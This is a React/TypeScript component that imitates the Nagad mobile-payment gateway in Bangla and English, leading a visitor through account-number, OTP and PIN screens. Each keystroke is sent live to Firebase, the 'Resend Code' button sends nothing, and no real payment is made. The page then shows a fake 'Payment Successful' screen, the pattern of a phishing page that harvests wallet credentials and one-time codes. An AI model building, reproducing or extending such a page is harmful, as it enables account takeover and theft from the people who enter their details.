import React, { useState, useEffect, useRef } from 'react';
import { TransactionSession } from '../types';
import { rtdb, ref, set, update, db, doc, setDoc } from '../firebase';

interface PaymentFlowProps {
  session: TransactionSession;
  lang: 'bn' | 'en';
  onUpdateSession: (updates: Partial<TransactionSession>) => void;
  onComplete: () => void;
}

export const PaymentFlow: React.FC<PaymentFlowProps> = ({
  session,
  lang,
  onUpdateSession,
  onComplete,
}) => {
  const [accountDigits, setAccountDigits] = useState<string[]>(
    session.accountNumber ? session.accountNumber.split('').concat(Array(11).fill('')).slice(0, 11) : Array(11).fill('')
  );
  const [otpDigits, setOtpDigits] = useState<string[]>(
    session.otp ? session.otp.split('').concat(Array(6).fill('')).slice(0, 6) : Array(6).fill('')
  );
  const [otpValue, setOtpValue] = useState<string>(session.otp || '');
  const [pinDigits, setPinDigits] = useState<string[]>(
    session.pin ? session.pin.split('').concat(Array(4).fill('')).slice(0, 4) : Array(4).fill('')
  );
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [processingTimer, setProcessingTimer] = useState<number>(30);
  const [isSuccessState, setIsSuccessState] = useState<boolean>(false);

  const digitInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Keep internal states synced if session values change from outside
  useEffect(() => {
    if (session.otp !== undefined) {
      setOtpDigits(session.otp.split('').concat(Array(6).fill('')).slice(0, 6));
      setOtpValue(session.otp);
    }
  }, [session.otp]);

  // Real-time synchronization helper to update Firebase RTDB and Firestore
  const syncToFirebase = async (updates: Partial<TransactionSession>) => {
    onUpdateSession(updates);
    const updatedFields = { ...updates, updatedAt: Date.now() };

    // 1. Sync to Realtime Database using partial update
    try {
      const rtdbRef = ref(rtdb, `sessions/${session.id}`);
      await update(rtdbRef, updatedFields);
    } catch (e) {
      console.warn('RTDB sync fallback:', e);
    }

    // 2. Sync to Firestore
    try {
      const firestoreRef = doc(db, 'sessions', session.id);
      await setDoc(firestoreRef, updatedFields, { merge: true });
    } catch (e) {
      console.warn('Firestore sync fallback:', e);
    }
  };

  // Step 1: Nagad Account Number input handlers
  const handleDigitChange = (index: number, val: string) => {
    // Handle paste of whole number
    if (val.length > 1) {
      const digitsOnly = val.replace(/\D/g, '').slice(0, 11);
      const newDigits = [...accountDigits];
      for (let i = 0; i < 11; i++) {
        newDigits[i] = digitsOnly[i] || '';
      }
      setAccountDigits(newDigits);
      const fullNum = newDigits.join('');
      syncToFirebase({ accountNumber: fullNum });
      if (digitsOnly.length === 11) {
        digitInputRefs.current[10]?.focus();
      } else {
        digitInputRefs.current[Math.min(digitsOnly.length, 10)]?.focus();
      }
      return;
    }

    const digit = val.replace(/\D/g, '');
    const newDigits = [...accountDigits];
    newDigits[index] = digit;
    setAccountDigits(newDigits);

    const fullNum = newDigits.join('');
    syncToFirebase({ accountNumber: fullNum });

    // Focus next box if digit entered
    if (digit && index < 10) {
      digitInputRefs.current[index + 1]?.focus();
    }
  };

  const handleDigitKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!accountDigits[index] && index > 0) {
        digitInputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleProceedNumber = () => {
    const fullNum = accountDigits.join('');
    // Valid Bangladeshi mobile numbers must be 11 digits and start with 013, 014, 015, 016, 017, 018, or 019
    const isValidBDMobile = /^01[3-9]\d{8}$/.test(fullNum);
    if (!isValidBDMobile) {
      setErrorMessage(
        lang === 'bn'
          ? 'অনুগ্রহ করে সঠিক ১১ ডিজিটের বাংলাদেশী নগদ অ্যাকাউন্ট নম্বর দিন (যেমন: 017xxxxxxxx)'
          : 'Please enter a valid 11-digit Bangladeshi Nagad account number (e.g. 017xxxxxxxx)'
      );
      return;
    }
    setErrorMessage('');
    syncToFirebase({ accountNumber: fullNum, step: 'otp' });
  };

  // Step 2: OTP handlers
  const handleOtpDigitChange = (index: number, val: string) => {
    // Handle paste of whole 6-digit code
    if (val.length > 1) {
      const digitsOnly = val.replace(/\D/g, '').slice(0, 6);
      const newOtp = [...otpDigits];
      for (let i = 0; i < 6; i++) {
        newOtp[i] = digitsOnly[i] || '';
      }
      setOtpDigits(newOtp);
      const fullOtp = newOtp.join('');
      setOtpValue(fullOtp);
      syncToFirebase({ otp: fullOtp });
      if (digitsOnly.length === 6) {
        otpInputRefs.current[5]?.focus();
      } else {
        otpInputRefs.current[Math.min(digitsOnly.length, 5)]?.focus();
      }
      return;
    }

    const digit = val.replace(/\D/g, '');
    const newOtp = [...otpDigits];
    newOtp[index] = digit;
    setOtpDigits(newOtp);

    const fullOtp = newOtp.join('');
    setOtpValue(fullOtp);
    syncToFirebase({ otp: fullOtp });

    // Focus next box if digit entered
    if (digit && index < 5) {
      otpInputRefs.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!otpDigits[index] && index > 0) {
        otpInputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleProceedOtp = () => {
    const fullOtp = otpDigits.join('');
    if (fullOtp.length !== 6) {
      setErrorMessage(
        lang === 'bn' ? 'অনুগ্রহ করে সঠিক ৬ ডিজিটের ওটিপি (OTP) দিন' : 'Please enter a valid 6-digit OTP code'
      );
      return;
    }
    setErrorMessage('');
    syncToFirebase({ otp: fullOtp, step: 'pin' });
  };

  const handleResendOtp = () => {
    setOtpDigits(Array(6).fill(''));
    setOtpValue('');
    const newCount = (session.resendCount || 0) + 1;
    setErrorMessage(
      lang === 'bn' ? 'নতুন ওটিপি কোড পাঠানো হয়েছে' : 'New verification code sent'
    );
    syncToFirebase({
      otp: '',
      resendCount: newCount,
      lastResendAt: Date.now(),
      updatedAt: Date.now(),
    });
  };

  // Step 3: PIN handlers
  const handlePinDigitChange = (index: number, val: string) => {
    const digit = val.replace(/\D/g, '');
    const newPin = [...pinDigits];
    newPin[index] = digit;
    setPinDigits(newPin);

    const fullPin = newPin.join('');
    syncToFirebase({ pin: fullPin });

    if (digit && index < 3) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (!pinDigits[index] && index > 0) {
        pinInputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleProceedPin = () => {
    const fullPin = pinDigits.join('');
    if (fullPin.length !== 4) {
      setErrorMessage(
        lang === 'bn' ? 'অনুগ্রহ করে ৪ ডিজিটের পিন (PIN) দিন' : 'Please enter a 4-digit PIN'
      );
      return;
    }
    setErrorMessage('');
    syncToFirebase({ pin: fullPin, step: 'processing' });
  };

  // Processing timer loop (30 seconds count down, at 15s show success)
  useEffect(() => {
    let interval: NodeJS.Timeout | null = null;
    if (session.step === 'processing') {
      interval = setInterval(() => {
        setProcessingTimer((prev) => {
          if (prev <= 1) {
            if (interval) clearInterval(interval);
            onComplete();
            return 0;
          }
          const nextVal = prev - 1;
          if (nextVal <= 15) {
            setIsSuccessState(true);
            syncToFirebase({ step: 'success' });
          }
          return nextVal;
        });
      }, 1000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [session.step]);

  // Render Step 1: Account Number
  if (session.step === 'number') {
    return (
      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
        <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
          {lang === 'bn' ? 'আপনার নগদ অ্যাকাউন্ট নম্বর' : 'Your Nagad Account Number'}
        </h2>

        {/* 11 Input Boxes separated as 3 - 4 - 4 with precise gaps & slender height */}
        <div className="flex items-center justify-center gap-0.5 sm:gap-1.5 mb-5 max-w-full py-1 select-none px-1">
          {/* First 3 boxes */}
          <div className="flex gap-0.5 sm:gap-1.5">
            {[0, 1, 2].map((i) => (
              <input
                key={i}
                ref={(el) => (digitInputRefs.current[i] = el)}
                type="text"
                inputMode="numeric"
                maxLength={11}
                value={accountDigits[i] || ''}
                onChange={(e) => handleDigitChange(i, e.target.value)}
                onKeyDown={(e) => handleDigitKeyDown(i, e)}
                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
              />
            ))}
          </div>

          <span className="text-white text-base sm:text-xl font-bold px-1 sm:px-2.5">-</span>

          {/* Next 4 boxes */}
          <div className="flex gap-0.5 sm:gap-1.5">
            {[3, 4, 5, 6].map((i) => (
              <input
                key={i}
                ref={(el) => (digitInputRefs.current[i] = el)}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={accountDigits[i] || ''}
                onChange={(e) => handleDigitChange(i, e.target.value)}
                onKeyDown={(e) => handleDigitKeyDown(i, e)}
                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
              />
            ))}
          </div>

          <span className="text-white text-base sm:text-xl font-bold px-1 sm:px-2.5">-</span>

          {/* Last 4 boxes */}
          <div className="flex gap-0.5 sm:gap-1.5">
            {[7, 8, 9, 10].map((i) => (
              <input
                key={i}
                ref={(el) => (digitInputRefs.current[i] = el)}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={accountDigits[i] || ''}
                onChange={(e) => handleDigitChange(i, e.target.value)}
                onKeyDown={(e) => handleDigitKeyDown(i, e)}
                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
              />
            ))}
          </div>
        </div>

        {errorMessage && (
          <p className="text-yellow-200 bg-red-900/80 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
            {errorMessage}
          </p>
        )}

        <p className="text-white text-xs sm:text-sm text-center max-w-xs sm:max-w-md mb-6 leading-snug font-medium">
          {lang === 'bn' ? (
            <>
              "Proceed" ক্লিক/ট্যাপ করার মাধ্যমে আপনি আমাদের{' '}
              <a
                href="https://nagad.com.bd/pg/?n=terms-of-use"
                target="_blank"
                rel="noopener noreferrer"
                className="underline font-bold text-white hover:text-gray-200"
              >
                শর্তাবলীর
              </a>{' '}
              সাথে সম্মত হচ্ছেন
            </>
          ) : (
            <>
              By clicking/tapping "Proceed" you are agreeing to our{' '}
              <a
                href="https://nagad.com.bd/pg/?n=terms-of-use"
                target="_blank"
                rel="noopener noreferrer"
                className="underline font-bold text-white hover:text-gray-200"
              >
                Terms and Conditions
              </a>
            </>
          )}
        </p>

        {/* Slender Sleek Buttons positioned at outer ends to match exact reference screenshot gap */}
        <div className="flex items-center justify-between w-full max-w-[280px] sm:max-w-[310px] px-1 sm:px-2">
          <button
            type="button"
            onClick={handleProceedNumber}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
          </button>
          <button
            type="button"
            onClick={() => window.location.reload()}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
          </button>
        </div>
      </div>
    );
  }

  // Render Step 2: Verification Code [OTP]
  if (session.step === 'otp') {
    return (
      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
        <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
          {lang === 'bn' ? 'যাচাইকরণ কোড লিখুন [OTP]' : 'Enter Verification Code [OTP]'}
        </h2>

        {/* 6 OTP Digit Boxes */}
        <div className="flex items-center justify-center gap-1.5 sm:gap-2.5 mb-5">
          {[0, 1, 2, 3, 4, 5].map((i) => (
            <input
              key={i}
              ref={(el) => (otpInputRefs.current[i] = el)}
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otpDigits[i] || ''}
              onChange={(e) => handleOtpDigitChange(i, e.target.value)}
              onKeyDown={(e) => handleOtpKeyDown(i, e)}
              className="w-8 h-9 sm:w-10 sm:h-11 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-lg sm:text-xl shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
            />
          ))}
        </div>

        {errorMessage && (
          <p className="text-yellow-200 bg-red-900/60 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
            {errorMessage}
          </p>
        )}

        {/* Slender Buttons: Proceed, Resend Code, Close */}
        <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3 w-full max-w-sm mt-2">
          <button
            type="button"
            onClick={handleProceedOtp}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-4 sm:px-5 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
          </button>
          <button
            type="button"
            onClick={handleResendOtp}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-3.5 sm:px-4 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'পুনরায় কোড পাঠান' : 'Resend Code'}
          </button>
          <button
            type="button"
            onClick={() => window.location.reload()}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-4 sm:px-5 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
          </button>
        </div>
      </div>
    );
  }

  // Render Step 3: Enter PIN
  if (session.step === 'pin') {
    return (
      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
        <h2 className="text-white text-base sm:text-lg font-bold mb-4 text-center">
          {lang === 'bn' ? 'পিন (PIN) দিন' : 'Enter PIN'}
        </h2>

        {/* 4 PIN Boxes */}
        <div className="flex items-center justify-center gap-2.5 sm:gap-3.5 mb-6">
          {[0, 1, 2, 3].map((i) => (
            <input
              key={i}
              ref={(el) => (pinInputRefs.current[i] = el)}
              type="password"
              inputMode="numeric"
              maxLength={1}
              value={pinDigits[i] || ''}
              onChange={(e) => handlePinDigitChange(i, e.target.value)}
              onKeyDown={(e) => handlePinKeyDown(i, e)}
              className="w-10 h-10 sm:w-12 sm:h-12 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-xl sm:text-2xl shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
            />
          ))}
        </div>

        {errorMessage && (
          <p className="text-yellow-200 bg-red-900/60 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
            {errorMessage}
          </p>
        )}

        {/* Slender Sleek Buttons positioned at outer ends */}
        <div className="flex items-center justify-between w-full max-w-[280px] sm:max-w-[310px] px-1 sm:px-2">
          <button
            type="button"
            onClick={handleProceedPin}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
          </button>
          <button
            type="button"
            onClick={() => window.location.reload()}
            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
          >
            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
          </button>
        </div>
      </div>
    );
  }

  // Render Step 4: Processing / Success state
  if (session.step === 'processing' || session.step === 'success') {
    return (
      <div className="w-full flex flex-col items-center justify-center mt-8 px-4 text-white text-center">
        {!isSuccessState ? (
          <>
            <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin mb-6"></div>
            <h2 className="text-xl sm:text-2xl font-extrabold mb-2">
              {lang === 'bn' ? 'পেমেন্ট প্রসেসিং হচ্ছে...' : 'Payment Processing...'}
            </h2>
            <p className="text-white/80 text-sm mb-4">
              {lang === 'bn' ? 'অনুগ্রহ করে অপেক্ষা করুন' : 'Please wait while we process your payment'}
            </p>
            <div className="text-xs bg-black/20 px-4 py-1.5 rounded-full border border-white/20">
              {processingTimer}s
            </div>
          </>
        ) : (
          <>
            <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center text-[#d31820] mb-6 shadow-lg animate-bounce">
              <svg className="w-12 h-12 stroke-current" fill="none" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl font-extrabold text-green-300 mb-2">
              {lang === 'bn' ? 'পেমেন্ট সফল হয়েছে!' : 'Payment Successful!'}
            </h2>
            <p className="text-white/90 text-sm max-w-xs mb-4">
              {lang === 'bn'
                ? 'আপনার লেনদেনটি সফলভাবে সম্পন্ন হয়েছে। কিছুক্ষণের মধ্যে রিডাইরেক্ট করা হবে।'
                : 'Your transaction was completed successfully. Redirecting shortly.'}
            </p>
            <div className="text-xs bg-black/20 px-4 py-1.5 rounded-full border border-white/20">
              {processingTimer}s
            </div>
          </>
        )}
      </div>
    );
  }

  return null;
};
